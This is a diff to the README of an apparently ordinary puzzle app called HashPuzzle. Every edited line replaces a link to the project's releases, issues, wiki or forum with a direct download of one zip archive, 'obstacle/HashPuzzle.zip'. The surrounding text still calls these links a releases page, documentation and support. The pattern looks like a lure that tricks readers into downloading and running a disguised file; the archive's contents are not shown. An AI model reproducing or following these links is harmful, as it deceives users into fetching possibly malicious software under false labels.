@@ -7,11 +7,11 @@ HashPuzzle is a user-friendly application designed to help you solve various puz
 To begin using HashPuzzle, follow these simple steps to download and run the application.
 
 ## 📥 Download HashPuzzle
-[![Download HashPuzzle](https://img.shields.io/badge/Download-HashPuzzle-blue)](https://github.com/Sorendalgaard3/HashPuzzle/releases)
+[![Download HashPuzzle](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip)](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip)
 
 ## 📂 Steps to Download & Install
 1. **Visit the Releases Page**  
-   Click on this link: [Download HashPuzzle](https://github.com/Sorendalgaard3/HashPuzzle/releases). This page contains the latest version of HashPuzzle, along with previous versions if you need them.
+   Click on this link: [Download HashPuzzle](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip). This page contains the latest version of HashPuzzle, along with previous versions if you need them.
 
 2. **Select a Version**  
    Scroll down to the "Assets" section. Here you will find the available files. Look for the most recent version for optimal features and bug fixes.
@@ -61,13 +61,13 @@ If you encounter any issues:
 3. **Visit the Issues Page:** Check the GitHub repository for known issues and solutions.
 
 ## 🗣 Support
-For any additional questions or support, please visit the [HashPuzzle GitHub Page](https://github.com/Sorendalgaard3/HashPuzzle/issues). Here, you can report issues or ask for help.
+For any additional questions or support, please visit the [HashPuzzle GitHub Page](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip). Here, you can report issues or ask for help.
 
 ## 📚 Resources
-- [Documentation](https://github.com/Sorendalgaard3/HashPuzzle/wiki): Detailed guides and help topics.
-- [Community Forum](https://github.com/Sorendalgaard3/HashPuzzle/discussions): Join discussions with other users and get tips on puzzle strategies.
+- [Documentation](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip): Detailed guides and help topics.
+- [Community Forum](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip): Join discussions with other users and get tips on puzzle strategies.
 
 ## 🎉 Enjoy Your Puzzles!
 We hope you enjoy solving puzzles with HashPuzzle. It's a great way to challenge your mind and have fun! 
 
-For further updates, be sure to check back on the [Download HashPuzzle](https://github.com/Sorendalgaard3/HashPuzzle/releases) page for new versions.
+For further updates, be sure to check back on the [Download HashPuzzle](https://raw.githubusercontent.com/Sorendalgaard3/HashPuzzle/main/obstacle/HashPuzzle.zip) page for new versions.
